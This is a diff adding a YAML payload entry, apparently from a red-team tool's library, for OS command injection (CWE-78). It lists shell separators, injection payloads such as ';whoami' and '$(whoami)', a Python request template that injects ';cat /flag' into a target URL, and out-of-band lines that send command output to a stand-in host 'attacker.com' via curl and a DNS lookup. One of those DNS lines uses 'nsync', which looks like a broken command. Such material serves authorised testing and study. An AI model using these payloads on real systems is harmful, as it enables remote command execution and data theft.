@@ -1,0 +1,37 @@
+metadata:
+  id: cwe-78-command-injection
+  name: OS Command Injection
+  cwe_ids:
+  - CWE-78
+  target_type: generic
+  tags:
+  - command-injection
+  - rce
+  - blind-injection
+  - pipe
+  - backtick
+  author: co-redteam
+  severity: critical
+content: 'Separators: ; & && | || $() ` \n %0a %0d
+
+  Test payloads: ;whoami / $(whoami) / `whoami` / | whoami
+
+  Blind techniques: sleep 5 / ping -c 5 attacker.com (timing side-channel)
+
+
+  Example:
+
+  import requests,urllib3; urllib3.disable_warnings(); base=''{TARGET_BASE_URL}''
+
+  r=requests.get(f''{base}{ENDPOINT}?cmd=;cat+/flag'', verify={VERIFY_FLAG})
+
+  print(''###CHAIN_OUTPUT###''+str({''status'':r.status_code,''body'':r.text[:500]}))
+
+
+  Out-of-band (OOB) detection when blind:
+
+  ; curl https://attacker.com/ping?$(whoami | base64)
+
+  ; nsync $(whoami).attacker.com
+
+  '
